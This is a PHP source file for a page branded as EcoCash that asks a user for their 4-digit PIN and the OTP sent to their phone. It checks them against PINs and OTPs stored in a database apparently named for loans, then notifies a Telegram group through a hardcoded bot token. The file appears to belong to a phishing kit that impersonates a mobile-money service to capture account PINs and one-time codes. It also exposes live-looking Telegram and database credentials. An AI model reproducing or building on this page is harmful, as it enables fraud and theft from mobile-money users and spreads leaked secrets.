<?php
session_start();

// ========== CONFIGURATION ==========
$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";

// PostgreSQL credentials
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==================================

// Get phone from session
$phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
$error = '';
$flashMessage = '';

// Retrieve flash message if exists
if (isset($_SESSION['flash_error'])) {
    $flashMessage = $_SESSION['flash_error'];
    unset($_SESSION['flash_error']);
}

// If no phone in session, redirect back to index
if (empty($phone)) {
    header("Location: index.php");
    exit;
}

/**
 * Get PostgreSQL connection (singleton)
 * @return resource|false
 */
function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
if (!$conn) {
    die("Database connection failed. Please contact admin.");
}

// Handle form submission (PIN/OTP verification)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $entered_pin = $_POST['pin'] ?? '';
    $entered_otp = $_POST['otp'] ?? '';
    
    // Get stored PIN and OTP from database for this phone
    $sql = "SELECT pin, otp FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
    $result = pg_query_params($conn, $sql, [$phone]);
    
    if ($result && $row = pg_fetch_assoc($result)) {
        $stored_pin = $row['pin'];
        $stored_otp = $row['otp'];
        
        $pin_valid = ($entered_pin == $stored_pin);
        $otp_valid = ($entered_otp == $stored_otp);
        
        if ($pin_valid && $otp_valid) {
            // Both correct: update status and otp_status
            pg_query_params($conn, "UPDATE ecocash_auth SET status = 1, otp_status = 1 WHERE phone = $1", [$phone]);
            
            // Optionally send Telegram notification
            $message = "✅ User $phone successfully verified PIN and OTP.";
            file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
            
            // Redirect to dashboard
            header("Location: dashboard.php");
            exit;
        } else {
            $_SESSION['flash_error'] = "Invalid PIN or OTP. Please try again.";
            header("Location: verify.php");
            exit;
        }
    } else {
        $_SESSION['flash_error'] = "No account found for this phone.";
        header("Location: index.php");
        exit;
    }
}

// If we reach here, show the verification form
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify PIN & OTP | EcoCash</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            margin: 0;
            background: #f1f5f9;
            font-family: Arial, Helvetica, sans-serif;
        }
        .header {
            text-align: center;
            padding: 15px;
            font-size: 20px;
            font-weight: bold;
        }
        .header span:first-child { color: red; }
        .header span:last-child { color: #2563eb; }
        .card {
            max-width: 400px;
            margin: 40px auto;
            background: #fff;
            padding: 25px;
            border-radius: 18px;
            box-shadow: 0 8px 25px rgba(0,0,0,.08);
        }
        .title {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 8px 0 16px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: #2563eb;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .error {
            background: #fee2e2;
            color: #dc2626;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="header">
    <span>Eco</span><span>Cash</span>
</div>
<div class="card">
    <div class="title">Verify Your Identity</div>
    <?php if ($flashMessage): ?>
        <div class="error"><?= htmlspecialchars($flashMessage) ?></div>
    <?php endif; ?>
    <form method="POST">
        <label>Enter 4-digit PIN</label>
        <input type="password" name="pin" maxlength="4" required>
        
        <label>Enter OTP sent to your phone</label>
        <input type="text" name="otp" required>
        
        <button type="submit">Verify & Continue</button>
    </form>
</div>
</body>
</html>
